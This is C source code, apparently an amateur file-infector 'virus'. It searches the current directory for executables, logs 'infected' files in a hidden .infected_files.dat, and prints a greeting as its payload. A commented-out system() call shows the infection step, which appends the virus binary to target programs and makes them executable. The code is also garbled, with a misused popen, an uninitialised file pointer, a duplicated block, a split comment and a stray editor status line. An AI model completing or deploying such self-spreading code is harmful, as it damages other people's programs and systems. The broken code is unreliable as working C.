#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>

//The size of this executable after compilation
#define VIRUS_SIZE	13840

// Place a virus signature for checking if file is infected
#define VIRUS_SIGN	1745

void payload() {
	fputs("Hello! I am a simple virus!\n", stdout);
}

int check_infected(char *filename){
// Create a temp file to store the infected file names. If dont exist then create one and store the i
nput filename into it.
//Returns 1 if the infected file is already in the list, return 0 if not in list and appended

	FILE* fp = fopen("./.infected_files.dat", "r");
	char line[256];
	int infected_flag = 1;

	if (fp == NULL){
		fp = fopen("./.infected_files.dat", "w");
		strcat(filename, "\n");
		fwrite(filename, 1, sizeof(filename), fp);
		fclose(fp);

		return 0;
	} else{
		while(fgets(line, sizeof(line), fp) != NULL){
			if (strstr(line, filename)){
				infected_flag = 0;
				fclose(fp);
				return 1;
			}
		}

		if (infected_flag == 1){
			fp = fopen("./.infected_files.dat", "a");
               		strcat(filename, "\n");
                	fwrite(filename, 1, sizeof(filename), fp);
         		fclose(fp);
                        if (strstr(line, filename)){
                                infected_flag = 0;
                                fclose(fp);
                                return 1;
                        }
                }

                if (infected_flag == 1){
                        fp = fopen("./.infected_files.dat", "a");
                        strcat(filename, "\n");
                        fwrite(filename, 1, sizeof(filename), fp);
                        fclose(fp);
                        return 0;
                }
        }
}
int find_target(void){
        DIR *dir;
        struct dirent *ent;
        struct stat sb;
        FILE * fp;
        char buff[BUFSIZ];

        dir = opendir(".");
        for (ent = readdir(dir); ent != NULL; ent = readdir(dir)) {
                if ((strcmp(ent->d_name, "virus") == 0) || (strcmp(ent->d_name, ".") == 0) || (strcmp(ent->d_name, "..") == 0))
                        continue;
                if ((stat(ent->d_name, &sb) >= 0) && (sb.st_mode > 0) && (S_IEXEC & sb.st_mode) && (!S_ISDIR(sb.st_mode)) && (!check_infected(ent->d_name))){

                        if (ent->d_name[strlen(ent->d_name)-1] == '\n')
                                ent->d_name[strlen(ent->d_name)-1] = '\0';
                        popen("./%s", ent->d_name);
                        while (fgets( buff, BUFSIZ, fp ) != NULL) {
                                 printf("result: %s\n", buff );
                        }

//                      char command[1000];
//                      sprintf(command, "cat virus %s > %s; chmod +x %s", ent->d_name, ent->d_name, ent->d_name);
//                      system(command);
                }
        }
}
int main(int argc, char *const argv[], char *const envp[]){
        find_target();
        payload();
        remove("./.infected_files.dat");
        return 0;
}
                                                                                   82,1          Bot